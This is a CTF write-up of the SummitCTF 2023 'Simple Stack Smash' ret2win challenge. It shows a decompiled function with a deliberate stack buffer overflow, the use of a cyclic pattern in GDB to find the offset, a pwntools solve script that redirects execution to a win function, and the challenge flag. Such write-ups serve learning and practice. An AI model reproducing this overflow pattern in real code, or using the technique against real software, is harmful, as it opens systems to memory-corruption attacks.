---
title: "Simple Stack Smash (SummitCTF 2023)"
summary: "Easy pwn Challenge - ret2win"
description: "Easy pwn Challenge - ret2win"
tags: [PWN, easy, writeup, ret2win]
date: 2023-04-23T22:00:00-05:00
draft: false
searchHidden: false
ShowToc: true
TocOpen: false
hidemeta: false
# weight: 1
---

## Description

Can you perform a simple stack smash? I hope so, you'll need to in order to reach the summit... (100 points)

Given file: [simple-stack-smash](/summitctf-simple-stack-smash/simple-stack-smash)

---

## Writeup

I'm going to use GDB with the [pwndbg](https://github.com/pwndbg/pwndbg) plugin for this challenge. Run `gdb <file>`

![name](/summitctf-simple-stack-smash/2023-04-23-21-44-48.png#center)

Here is the main function revealed in Ghidra:

```c
undefined4 main(void)
{
  char name_input [16];
  
  setvbuf(stdout,(char *)0,2,0);
  setvbuf(stderr,(char *)0,2,0);
  printf("Please enter your name: ");
  fgets(name_input,1024,stdin);
  printf("Hello, %s!\n",name_input);
  return 0;
}
```
Curiously, there exists a `win` function:

```c
void win(void)
{
  system("cat /src/flag.txt");
  exit(0);
}
```

A ret2win challenge, where the objective is to redirect execution to the win function (`win_addr`). To do so, we need to figure out at what point of our input, the buffer overflow occurs (`offset`).

In gdb, `info fun win`: gives us the win_addr =` 0x08049216`

To find the offset we send a bunch of strings in the following cyclic pattern:
`aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa..` to find until what letter can the stack hold.
```py
#!/usr/bin/python3

from pwn import *

elf = ELF("./simple-stack-smash")
p = elf.process()
win_addr = 0x08049216

context.binary = elf
context.log_level = "DEBUG"
gdb.attach(p)

p.sendline(cyclic(100))  # send pattern
p.interactive()  
# run script, enter 'c' in gdb to continue
```
We can see in gdb that the program SEGFAULTed when it's `%EIP` was pointing to 'gaaa' which caused the buffer overflow. If you're unfamiliar with assembly registers, `%EIP` is the instruction pointer which tells the computer what the next command is that must be executed. After making `%EIP` to point to our win function, we get the flag.

![name](/summitctf-simple-stack-smash/2023-04-23-23-04.png#center)

&nbsp;

### Solve script
Completing the script:
```py
#!/usr/bin/python3

from pwn import *

elf = ELF("./simple-stack-smash")
p = elf.process()
win_addr = 0x08049216

context.binary = elf

# context.log_level = "DEBUG"
# gdb.attach(p)
# p.sendline(cyclic(100))  # sending pattern

offset = cyclic_find("gaaa")

p.sendlineafter(b"name: ", b"A" * offset + p32(win_addr))
p.interactive()
```

## Flag

`summitCTF{G1mMI3_S0M3th1NG_H4rD3r_PlZ}`

---